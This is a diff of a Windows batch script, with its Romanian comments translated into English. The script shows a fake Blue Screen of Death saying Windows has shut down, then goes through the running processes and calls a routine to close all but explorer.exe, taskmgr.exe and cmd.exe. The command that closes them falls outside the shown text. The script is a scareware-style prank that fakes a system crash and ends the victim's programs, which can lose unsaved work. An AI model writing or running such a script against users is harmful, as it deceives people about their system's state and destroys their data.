@@ -1,6 +1,11 @@
 @echo off
-color 1f
+:: Set the CMD window color to blue with white text (simulating BSOD)
+color 1F
+
+:: Clear the screen for a cleaner appearance
 cls
+
+:: Display simulated BSOD message
 echo A problem has been detected and Windows has been shut down to prevent damage to your computer.
 echo.
 echo Technical information:
@@ -13,7 +18,7 @@ echo.
 echo Press any key to continue...
 pause >nul
 
-:: Închide aplicațiile care nu sunt esențiale pentru Windows
+:: Close non-essential applications
 echo Closing non-essential applications...
 tasklist /FI "STATUS eq running" > tasklist.txt
 for /F "tokens=1,2" %%A in (tasklist.txt) do (
@@ -22,11 +27,11 @@ for /F "tokens=1,2" %%A in (tasklist.txt) do (
     call :close_proc
 )
 
-:: Afișează o fereastră cu BSOD simulată
+:: Simulate BSOD window and exit
 exit
 
 :close_proc
-rem Excludem procesele Windows esențiale
+rem Exclude essential Windows processes from being closed
 if /I "%proc_name%" NEQ "explorer.exe" (
     if /I "%proc_name%" NEQ "taskmgr.exe" (
         if /I "%proc_name%" NEQ "cmd.exe" (
